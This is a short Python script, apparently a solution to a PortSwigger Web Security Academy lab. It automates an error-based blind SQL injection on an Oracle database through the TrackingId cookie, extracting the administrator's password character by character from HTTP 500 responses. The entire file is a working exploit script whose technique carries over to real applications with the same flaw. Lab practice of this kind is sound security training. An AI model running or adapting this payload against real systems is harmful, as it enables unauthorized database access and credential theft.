import requests
import string

url = "https://0a2300e604760f7fc0ba019900270056.web-security-academy.net/"
charset = string.ascii_lowercase + string.digits

# ORACLE DB - Error-based Blind SQLi
# Required to limit returned rows to 1. If not error occurs as string concatenation fails.
password = ''
length = 0
while True:
    length += 1
    for i in charset: 
        payload = f"EtxvGxsqQZQ7cKX8' || (SELECT CASE WHEN SUBSTR(password, 1, {length})='{password+i}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '"
        # print(payload)
        cookies = {'TrackingId': payload}
        r = requests.get(url, cookies=cookies)
        if r.status_code == 500:
            password += i
            print(password)
            break
    print(length)

